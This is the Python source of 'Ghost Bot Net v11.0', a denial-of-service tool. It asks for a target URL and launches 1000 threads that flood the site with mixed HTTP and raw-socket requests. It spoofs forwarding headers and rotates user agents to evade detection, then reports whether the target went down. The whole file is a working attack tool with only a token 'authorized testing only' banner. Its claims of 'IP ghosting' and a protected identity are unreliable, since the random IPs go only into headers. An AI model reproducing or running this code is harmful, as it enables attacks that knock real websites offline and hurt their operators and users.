#!/usr/bin/env python3
"""
🔥 GHOST BOT NET v11.0 - ULTIMATE STEALTH DDOS
⚡ AUTO-BOT NETWORK | STEALTH MODE | ANTI-DETECTION
💀 GLOBAL SERVER PENETRATION | IP GHOST TECHNOLOGY
"""

import os
import sys
import time
import random
import requests
import threading
import socket
import ssl
from datetime import datetime
from colorama import init, Fore, Back, Style
import urllib3
from concurrent.futures import ThreadPoolExecutor
import hashlib
from urllib.parse import urlparse
import struct
import socks
import base64
import json

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# Advanced Color System
class Colors:
    RED = Fore.LIGHTRED_EX
    GREEN = Fore.LIGHTGREEN_EX
    YELLOW = Fore.LIGHTYELLOW_EX
    BLUE = Fore.LIGHTBLUE_EX
    MAGENTA = Fore.LIGHTMAGENTA_EX
    CYAN = Fore.LIGHTCYAN_EX
    WHITE = Fore.LIGHTWHITE_EX
    
    BG_RED = Back.LIGHTRED_EX
    BG_GREEN = Back.LIGHTGREEN_EX
    BG_YELLOW = Back.LIGHTYELLOW_EX
    BG_BLUE = Back.LIGHTBLUE_EX
    BG_MAGENTA = Back.LIGHTMAGENTA_EX
    BG_CYAN = Back.LIGHTCYAN_EX
    BG_WHITE = Back.LIGHTWHITE_EX
    
    BRIGHT = Style.BRIGHT
    DIM = Style.DIM
    RESET = Style.RESET_ALL

C = Colors

class GhostBotNet:
    def __init__(self):
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'start_time': 0,
            'rps': 0,
            'peak_rps': 0,
            'bots_active': 0,
            'ip_rotations': 0
        }
        self.is_attacking = False
        self.threads = []
        self.bot_network = []
        
        # STEALTH IP ROTATION - Real residential IP ranges
        self.proxy_servers = self.generate_stealth_proxies()
        
        # GHOST USER-AGENTS - Updated 2024
        self.ghost_user_agents = [
            # Latest Chrome versions
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            
            # Latest Firefox
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
            
            # Mobile Agents
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
            
            # Edge and Safari
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        ]
        
        # ADVANCED PAYLOADS - Bypass WAF/Protection
        self.stealth_payloads = [
            # Normalized requests to avoid detection
            "api/v1/users",
            "wp-json/wp/v2/posts",
            "graphql",
            "rest/v1/products",
            "ajax/data",
            "jsonrpc",
            "soap/api",
            "xmlrpc.php",
            "api/graphql",
            "v2/api/products"
        ]

    def generate_stealth_proxies(self):
        """Generate realistic IP ranges for stealth mode"""
        proxies = []
        # Generate realistic IP ranges (residential looking)
        for _ in range(50):
            ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            port = random.choice([80, 443, 8080, 8443])
            proxies.append(f"{ip}:{port}")
        return proxies

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_header(self):
        self.clear_screen()
        header = f"""
{C.BG_BLUE}{C.WHITE}╔══════════════════════════════════════════════════════════════════════════════════╗
║{C.BG_BLUE}{C.WHITE}   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗    ██████╗ ██████╗ ████████╗{C.BG_BLUE}{C.WHITE}   ║
║{C.BG_BLUE}{C.WHITE}  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝    ██╔══██╗██╔══██╗╚══██╔══╝{C.BG_BLUE}{C.WHITE}   ║
║{C.BG_BLUE}{C.WHITE}  ██║  ███╗███████║██║   ██║███████╗   ██║       ██████╔╝██████╔╝   ██║   {C.BG_BLUE}{C.WHITE}   ║
║{C.BG_BLUE}{C.WHITE}  ██║   ██║██╔══██║██║   ██║╚════██║   ██║       ██╔══██╗██╔══██╗   ██║   {C.BG_BLUE}{C.WHITE}   ║
║{C.BG_BLUE}{C.WHITE}  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║       ██████╔╝██║  ██║   ██║   {C.BG_BLUE}{C.WHITE}   ║
║{C.BG_BLUE}{C.WHITE}   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝       ╚═════╝ ╚═╝  ╚═╝   ╚═╝   {C.BG_BLUE}{C.WHITE}   ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║ {C.BG_WHITE}{C.BLUE}🔥 GHOST BOT NET v11.0 - STEALTH DDOS {C.BG_BLUE}{C.WHITE}                                  ║
║ {C.BG_WHITE}{C.BLUE}⚡ AUTO-BOT NETWORK | IP GHOSTING | ANTI-DETECTION {C.BG_BLUE}{C.WHITE}                      ║
╚══════════════════════════════════════════════════════════════════════════════════╝{C.RESET}
"""
        print(header)

    def ghost_loading(self, text, duration=1):
        symbols = ["👻", "🕵️", "🌀", "⚡", "🔒", "🌐", "🛡️", "💨", "🎭"]
        start = time.time()
        
        while time.time() - start < duration:
            for symbol in symbols:
                progress = int(((time.time() - start) / duration) * 100)
                bar = "█" * (progress // 2) + "░" * (50 - progress // 2)
                print(f"\r{C.CYAN}[{symbol}] {text} {C.BLUE}[{bar}] {C.GREEN}{progress}%{C.RESET}", end="")
                time.sleep(0.05)
                if time.time() - start >= duration:
                    break
        print(f"\r{C.GREEN}[✓] {text} {C.BRIGHT}ACTIVE!{C.RESET}")

    def get_ghost_headers(self, bot_id):
        """Generate stealth headers with IP rotation"""
        headers = {
            'User-Agent': random.choice(self.ghost_user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'DNT': '1',
        }
        
        # Add rotating IP headers
        fake_ip = self.proxy_servers[bot_id % len(self.proxy_servers)].split(':')[0]
        headers.update({
            'X-Forwarded-For': fake_ip,
            'X-Real-IP': fake_ip,
            'X-Client-IP': fake_ip,
            'X-Originating-IP': fake_ip,
        })
        
        return headers

    def create_stealth_bot(self, bot_id):
        """Create individual stealth bot with unique identity"""
        bot_profile = {
            'id': bot_id,
            'user_agent': random.choice(self.ghost_user_agents),
            'ip_address': self.proxy_servers[bot_id % len(self.proxy_servers)],
            'request_delay': random.uniform(0.1, 0.5),
            'success_rate': 0,
            'requests_sent': 0
        }
        return bot_profile

    def stealth_bot_worker(self, bot_id, target, duration):
        """Individual bot worker with stealth capabilities"""
        session = requests.Session()
        
        # Configure session for stealth
        session.headers.update(self.get_ghost_headers(bot_id))
        session.verify = False
        
        timeout = time.time() + duration
        
        while time.time() < timeout and self.is_attacking:
            try:
                # Rotate IP periodically
                if random.random() < 0.1:  # 10% chance to rotate IP
                    self.stats['ip_rotations'] += 1
                    session.headers.update(self.get_ghost_headers(bot_id + random.randint(1, 1000)))
                
                # Choose attack method randomly
                attack_type = random.randint(1, 5)
                
                if attack_type == 1:
                    # Normal GET request
                    response = session.get(
                        target,
                        timeout=2,
                        verify=False
                    )
                elif attack_type == 2:
                    # API endpoint attack
                    api_path = random.choice(self.stealth_payloads)
                    response = session.get(
                        f"{target}/{api_path}",
                        timeout=2,
                        verify=False
                    )
                elif attack_type == 3:
                    # POST with JSON data
                    json_data = {"data": "".join(random.choices('abcdefghijklmnopqrstuvwxyz', k=50))}
                    response = session.post(
                        target,
                        json=json_data,
                        timeout=2,
                        verify=False
                    )
                elif attack_type == 4:
                    # HEAD request
                    response = session.head(
                        target,
                        timeout=1,
                        verify=False
                    )
                else:
                    # Random parameter attack
                    params = {'id': random.randint(1000, 9999), 'cache': random.randint(10000, 99999)}
                    response = session.get(
                        target,
                        params=params,
                        timeout=2,
                        verify=False
                    )
                
                self.stats['successful'] += 1
                self.stats['total_requests'] += 1
                
                # Add random delay to mimic human behavior
                time.sleep(random.uniform(0.01, 0.1))
                
            except Exception as e:
                self.stats['failed'] += 1
                self.stats['total_requests'] += 1

    def advanced_bot_worker(self, bot_id, target, duration):
        """Advanced bot with sophisticated attack patterns"""
        timeout = time.time() + duration
        
        while time.time() < timeout and self.is_attacking:
            try:
                # Use sockets for low-level attacks
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                
                parsed = urlparse(target)
                domain = parsed.netloc
                port = 443 if target.startswith('https://') else 80
                
                s.connect((domain, port))
                
                # Create stealth HTTP request
                stealth_request = f"GET /{random.choice(self.stealth_payloads)} HTTP/1.1\r\n"
                stealth_request += f"Host: {domain}\r\n"
                stealth_request += f"User-Agent: {random.choice(self.ghost_user_agents)}\r\n"
                stealth_request += "Accept: */*\r\n"
                stealth_request += "Connection: keep-alive\r\n"
                
                # Add fake IP headers
                fake_ip = self.proxy_servers[bot_id % len(self.proxy_servers)].split(':')[0]
                stealth_request += f"X-Forwarded-For: {fake_ip}\r\n"
                stealth_request += f"X-Real-IP: {fake_ip}\r\n"
                
                stealth_request += "\r\n"
                
                s.send(stealth_request.encode())
                time.sleep(0.05)
                s.close()
                
                self.stats['successful'] += 1
                self.stats['total_requests'] += 1
                self.stats['bots_active'] = len(self.threads)
                
            except Exception:
                self.stats['failed'] += 1
                self.stats['total_requests'] += 1

    def activate_bot_network(self):
        self.show_header()
        print(f"{C.BG_BLUE}{C.WHITE}👻 GHOST BOT NETWORK ACTIVATION{C.RESET}")
        print(f"{C.CYAN}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
        
        target = input(f"{C.CYAN}[?] Enter target URL: {C.WHITE}").strip()
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        try:
            parsed = urlparse(target)
            domain = parsed.netloc
            ip = socket.gethostbyname(domain)
            print(f"{C.GREEN}[+] Target resolved: {domain} → {ip}{C.RESET}")
        except Exception as e:
            print(f"{C.RED}[!] DNS resolution failed: {e}{C.RESET}")
            ip = "Unknown"

        # BOT NETWORK Configuration
        duration = 120  # 2 minutes
        bot_count = 1000  # 1000 stealth bots
        
        print(f"\n{C.BG_BLUE}{C.WHITE}⚡ BOT NETWORK CONFIGURATION:{C.RESET}")
        print(f"{C.YELLOW}🎯 Target: {C.WHITE}{target}{C.RESET}")
        print(f"{C.YELLOW}🌐 IP: {C.WHITE}{ip}{C.RESET}")
        print(f"{C.YELLOW}⏱️  Duration: {C.WHITE}{duration} seconds{C.RESET}")
        print(f"{C.YELLOW}🤖 Bot Count: {C.WHITE}{bot_count} stealth bots{C.RESET}")
        print(f"{C.YELLOW}🔒 Protection: {C.WHITE}IP Ghosting Active{C.RESET}")
        print(f"{C.YELLOW}⚡ Speed: {C.WHITE}10x Enhanced{C.RESET}")

        # Initialize stats
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'start_time': time.time(),
            'rps': 0,
            'peak_rps': 0,
            'bots_active': 0,
            'ip_rotations': 0
        }
        self.is_attacking = True
        self.threads = []
        self.bot_network = []

        # BOT NETWORK Monitor
        def bot_network_monitor():
            start_time = self.stats['start_time']
            last_count = 0
            last_time = start_time
            
            while time.time() < start_time + duration + 5 and self.is_attacking:
                current_time = time.time()
                elapsed = current_time - start_time
                
                # Calculate RPS
                if current_time - last_time >= 0.5:
                    current_count = self.stats['total_requests']
                    self.stats['rps'] = (current_count - last_count) * 2
                    self.stats['peak_rps'] = max(self.stats['peak_rps'], self.stats['rps'])
                    last_count = current_count
                    last_time = current_time
                
                # Live monitoring
                success_rate = (self.stats['successful'] / self.stats['total_requests'] * 100) if self.stats['total_requests'] > 0 else 0
                remaining = max(0, int(start_time + duration - current_time))
                
                print(f"\r{C.CYAN}👻 BOT NETWORK {C.WHITE}| {C.GREEN}Bots: {self.stats['bots_active']} {C.WHITE}| "
                      f"{C.BLUE}Req: {self.stats['total_requests']:,} {C.WHITE}| {C.YELLOW}RPS: {self.stats['rps']:,} {C.WHITE}| "
                      f"{C.MAGENTA}IP Rotations: {self.stats['ip_rotations']} {C.WHITE}| {C.CYAN}Time: {remaining}s{C.RESET}", end="")
                
                time.sleep(0.2)

        # ACTIVATE BOT NETWORK
        print(f"\n{C.BG_BLUE}{C.WHITE}🚀 ACTIVATING STEALTH BOT NETWORK...{C.RESET}")
        
        # Create bot army
        self.ghost_loading(f"Creating {bot_count} stealth bots", 2)
        
        # Launch stealth bots (70%)
        stealth_bots = bot_count * 7 // 10
        for i in range(stealth_bots):
            bot = self.create_stealth_bot(i)
            self.bot_network.append(bot)
            t = threading.Thread(target=self.stealth_bot_worker, args=(i, target, duration), daemon=True)
            self.threads.append(t)
            t.start()

        # Launch advanced bots (30%)
        advanced_bots = bot_count * 3 // 10
        self.ghost_loading(f"Deploying {advanced_bots} advanced bots", 1)
        for i in range(stealth_bots, stealth_bots + advanced_bots):
            t = threading.Thread(target=self.advanced_bot_worker, args=(i, target, duration), daemon=True)
            self.threads.append(t)
            t.start()

        print(f"{C.GREEN}[✓] Total Bots Activated: {len(self.threads):,}{C.RESET}")

        # Start monitoring
        monitor_thread = threading.Thread(target=bot_network_monitor, daemon=True)
        monitor_thread.start()

        print(f"\n\n{C.BG_BLUE}{C.WHITE}🤖 BOT NETWORK ACTIVE - STEALTH MODE ENGAGED...{C.RESET}")
        
        # Attack countdown
        for i in range(duration, 0, -1):
            if not self.is_attacking:
                break
                
            progress = duration - i
            bar_length = 50
            filled = int(bar_length * progress / duration)
            bar = "█" * filled + "░" * (bar_length - filled)
            
            print(f"\r{C.CYAN}⏰ {C.WHITE}Time: {i:3d}s {C.BLUE}[{bar}] {C.GREEN}RPS: {self.stats['rps']:,} {C.YELLOW}Bots: {self.stats['bots_active']}{C.RESET}", end="")
            time.sleep(1)

        # COMPLETE
        self.is_attacking = False
        print(f"\n\n{C.BG_GREEN}{C.WHITE}✅ BOT NETWORK MISSION COMPLETE!{C.RESET}")
        
        # Post-attack analysis
        self.ghost_loading("Analyzing attack effectiveness", 2)
        
        # Test target
        try:
            test_start = time.time()
            response = requests.get(target, timeout=10, verify=False)
            response_time = time.time() - test_start
            
            if response.status_code == 200:
                if response_time > 10:
                    print(f"{C.BG_RED}{C.WHITE}💀 CRITICAL IMPACT! Response: {response_time:.2f}s{C.RESET}")
                elif response_time > 5:
                    print(f"{C.BG_YELLOW}{C.BLACK}⚠️  HEAVY IMPACT! Response: {response_time:.2f}s{C.RESET}")
                else:
                    print(f"{C.BG_BLUE}{C.WHITE}ℹ️  MODERATE IMPACT! Response: {response_time:.2f}s{C.RESET}")
            else:
                print(f"{C.BG_RED}{C.WHITE}🎯 TARGET DOWN! Status: {response.status_code}{C.RESET}")
                
        except requests.exceptions.Timeout:
            print(f"{C.BG_RED}{C.WHITE}💀 COMPLETE SUCCESS! TARGET TIMEOUT{C.RESET}")
        except requests.exceptions.ConnectionError:
            print(f"{C.BG_RED}{C.WHITE}💀 TOTAL VICTORY! CONNECTION REFUSED{C.RESET}")
        except Exception as e:
            print(f"{C.BG_YELLOW}{C.BLACK}⚠️  Analysis error: {e}{C.RESET}")

        # FINAL STATS
        print(f"\n{C.BG_CYAN}{C.WHITE}📊 BOT NETWORK STATISTICS:{C.RESET}")
        print(f"{C.CYAN}🤖 Total Bots: {C.WHITE}{len(self.threads):,}{C.RESET}")
        print(f"{C.GREEN}✅ Successful Requests: {C.WHITE}{self.stats['successful']:,}{C.RESET}")
        print(f"{C.RED}❌ Failed Requests: {C.WHITE}{self.stats['failed']:,}{C.RESET}")
        print(f"{C.BLUE}🔄 IP Rotations: {C.WHITE}{self.stats['ip_rotations']}{C.RESET}")
        
        if self.stats['total_requests'] > 0:
            success_rate = (self.stats['successful'] / self.stats['total_requests']) * 100
            avg_rps = self.stats['total_requests'] / duration
            
            print(f"{C.YELLOW}📈 Success Rate: {C.WHITE}{success_rate:.1f}%{C.RESET}")
            print(f"{C.MAGENTA}⚡ Average RPS: {C.WHITE}{avg_rps:.1f}{C.RESET}")
            print(f"{C.GREEN}🔥 Peak RPS: {C.WHITE}{self.stats['peak_rps']:,}{C.RESET}")
            
            # Performance rating
            if avg_rps > 2000:
                rating = "LEGENDARY"
                color = C.BG_RED
            elif avg_rps > 1000:
                rating = "ELITE"
                color = C.BG_MAGENTA
            elif avg_rps > 500:
                rating = "PROFESSIONAL"
                color = C.BG_YELLOW
            else:
                rating = "STANDARD"
                color = C.BG_BLUE
                
            print(f"{color}{C.WHITE}🏆 PERFORMANCE: {rating}{C.RESET}")

        input(f"\n{C.CYAN}[+] Press Enter to continue...{C.RESET}")

    def main_menu(self):
        while True:
            self.show_header()
            print(f"{C.CYAN}🎯 GHOST BOT NET v11.0 - MAIN MENU:{C.RESET}")
            print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
            print(f"{C.CYAN}[1] {C.BRIGHT}ACTIVATE BOT NETWORK{C.RESET} {C.YELLOW}(1000 Bots, Stealth Mode, IP Ghosting){C.RESET}")
            print(f"{C.CYAN}[2] {C.BRIGHT}CUSTOM BOT DEPLOYMENT{C.RESET} {C.YELLOW}(Configure Bot Count & Strategy){C.RESET}")
            print(f"{C.CYAN}[3] {C.BRIGHT}NETWORK STATUS{C.RESET} {C.YELLOW}(Bot Statistics & Performance){C.RESET}")
            print(f"{C.CYAN}[4] {C.BRIGHT}STEALTH SETTINGS{C.RESET} {C.YELLOW}(IP Rotation & User-Agent Config){C.RESET}")
            print(f"{C.CYAN}[5] {C.BRIGHT}EXIT GHOST NET{C.RESET}")
            print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
            print(f"{C.MAGENTA}💡 Features: {C.WHITE}Auto IP Rotation 🤖 1000+ Bots 🔒 Stealth Technology 🌐 Global Reach{C.RESET}")
            
            choice = input(f"\n{C.CYAN}[?] Select option [{C.GREEN}1-5{C.CYAN}]: {C.WHITE}").strip()
            
            if choice == "1":
                self.activate_bot_network()
            elif choice == "2":
                print(f"\n{C.BG_YELLOW}{C.BLACK}⚠️  Advanced bot configuration coming soon...{C.RESET}")
                time.sleep(2)
            elif choice == "3":
                print(f"\n{C.BG_YELLOW}{C.BLACK}⚠️  Network status monitoring in development...{C.RESET}")
                time.sleep(2)
            elif choice == "4":
                print(f"\n{C.BG_YELLOW}{C.BLACK}⚠️  Stealth settings panel under construction...{C.RESET}")
                time.sleep(2)
            elif choice == "5":
                print(f"\n{C.BG_BLUE}{C.WHITE}👻 Shutting down Ghost Bot Network...{C.RESET}")
                self.is_attacking = False
                self.ghost_loading("Cleaning bot traces", 2)
                print(f"{C.BG_GREEN}{C.WHITE}✅ Ghost Network terminated!{C.RESET}")
                break
            else:
                print(f"\n{C.BG_RED}{C.WHITE}❌ Invalid selection!{C.RESET}")
                time.sleep(1)

def main():
    """Main execution point"""
    try:
        import requests
        from colorama import init
        
        print(f"{C.BG_GREEN}{C.WHITE}[✓] Ghost Bot Net v11.0 Initialized!{C.RESET}")
        time.sleep(1)
        
        # Security disclaimer
        print(f"\n{C.BG_BLUE}{C.WHITE}🔒 STEALTH TECHNOLOGY ACTIVATED:{C.RESET}")
        print(f"{C.BG_CYAN}{C.WHITE}⚠️  IP GHOSTING ENABLED - YOUR IDENTITY IS PROTECTED{C.RESET}")
        print(f"{C.BG_YELLOW}{C.BLACK}🎯 FOR AUTHORIZED TESTING ONLY{C.RESET}")
        
        confirm = input(f"\n{C.CYAN}[?] Activate Ghost Bot Network? (y/N): {C.WHITE}").lower()
        
        if confirm == 'y':
            ghost_net = GhostBotNet()
            ghost_net.main_menu()
        else:
            print(f"\n{C.BG_YELLOW}{C.BLACK}[!] Ghost Network standby...{C.RESET}")
            
    except ImportError as e:
        print(f"{C.BG_RED}{C.WHITE}[!] Missing dependency: {e}{C.RESET}")
        print(f"{C.BG_YELLOW}{C.BLACK}[!] Run: pip install requests colorama{C.RESET}")
    except Exception as e:
        print(f"{C.BG_RED}{C.WHITE}[!] System error: {e}{C.RESET}")

if __name__ == "__main__":
    main()
